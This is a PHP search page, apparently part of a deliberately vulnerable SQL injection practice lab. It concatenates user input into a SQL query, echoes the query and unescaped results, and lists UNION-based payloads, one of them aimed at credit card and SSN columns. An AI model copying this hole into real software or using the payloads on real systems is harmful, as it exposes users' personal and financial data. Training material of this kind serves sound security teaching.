<?php
include 'config.php';

// Simple search function - ALSO VULNERABLE!
if (isset($_GET['search'])) {
    $search = $_GET['search'];
    
    // VULNERABLE: Direct concatenation without sanitization
    $query = "SELECT id, username, email, role FROM users WHERE username LIKE '%$search%' OR email LIKE '%$search%'";
    
    echo "<h3>Search Results for: " . htmlspecialchars($search) . "</h3>";
    echo "<p><strong>Query executed:</strong> <code>$query</code></p>";
    
    $result = $conn->query($query);
    
    if ($result) {
        if ($result->num_rows > 0) {
            echo "<table border='1' style='border-collapse: collapse; width: 100%;'>";
            echo "<tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr>";
            
            while($row = $result->fetch_assoc()) {
                echo "<tr>";
                echo "<td>" . $row["id"] . "</td>";
                echo "<td>" . $row["username"] . "</td>";
                echo "<td>" . $row["email"] . "</td>";
                echo "<td>" . $row["role"] . "</td>";
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "<p>No users found.</p>";
        }
    } else {
        echo "<p style='color: red;'>Error: " . $conn->error . "</p>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>User Search - Also Vulnerable!</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .warning { background: #fff3cd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        input[type="text"] { padding: 8px; width: 300px; }
        button { padding: 8px 15px; }
        table { margin-top: 20px; }
        th, td { padding: 8px; text-align: left; }
    </style>
</head>
<body>
    <h1>🔍 User Search</h1>
    
    <div class="warning">
        <strong>Another vulnerable endpoint!</strong> This search function is also susceptible to SQL injection.
    </div>
    
    <form method="GET">
        <input type="text" name="search" placeholder="Search users..." value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search']) : ''; ?>">
        <button type="submit">Search</button>
    </form>
    
    <h3>Try these payloads:</h3>
    <ul>
        <li><code>admin' UNION SELECT 1,2,3,4 --</code></li>
        <li><code>' UNION SELECT id,secret_info,credit_card,ssn FROM sensitive_data --</code></li>
        <li><code>' AND 1=0 UNION SELECT 1,database(),user(),version() --</code></li>
    </ul>
    
    <p><a href="index.php">← Back to Login</a></p>
</body>
</html>
